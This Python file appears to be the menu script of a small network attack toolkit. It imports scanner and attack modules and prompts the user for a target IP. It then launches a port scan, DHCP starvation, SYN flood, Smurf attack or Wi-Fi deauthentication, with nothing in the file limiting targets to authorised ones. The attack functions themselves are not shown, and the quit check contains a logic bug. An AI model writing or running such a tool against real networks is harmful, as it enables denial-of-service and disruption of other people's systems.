from .HostScanner import *
from .PortScanner import *
from .DoSAttacks import *
from .DeauthAttack import *
    
# LOGIC
Q = True
while Q: 
    print("\nTELL ME WHAT TO DO?\n")
    print("HOST PORT SCANNER is         [1]")
    print("DHCP STARVATION ATTACK is    [2]")
    print("SYN FLOOD ATTACK is          [3]")
    print("SMURF ATTACK is              [4]")
    print("DEAUTHENTICATION ATTACK is   [5]")
    print("to quit                      [Q]\n")
    print("\n\nYou can allways break the attack by pressing [ctrl + c] and still be able to preform another attack")
    option = input("chose your option: ")

    if option == '1':
        host_ip = input("Enter target IP: ")
        delay = int(input("How many seconds the socket is going to wait until timeout: "))
        scan_ports(host_ip, delay)

    elif option =='2':
        router = input("Enter router IP address:")
        attack = "DHCP STARVATION"
        dos_dhcp()
        ping_log(attack, router)

    elif option =='3':
        target = input("Enter the target IP address like ex(192.168.1.10): ")
        attack = "SYN FLOOD"
        synFlood(target)
        ping_log(attack, target)
        

    elif option =='4':
        target = input("Enter the target IP address like ex(192.168.1.10): ")
        attack = "SMURF ATTACK"
        dos_smurf(target)
        ping_log(attack, target)
    
    elif option == '5':
        deauth()
    
    elif option == 'q' or 'Q':
        Q = False

    else:
        print("Pease choose a valid option")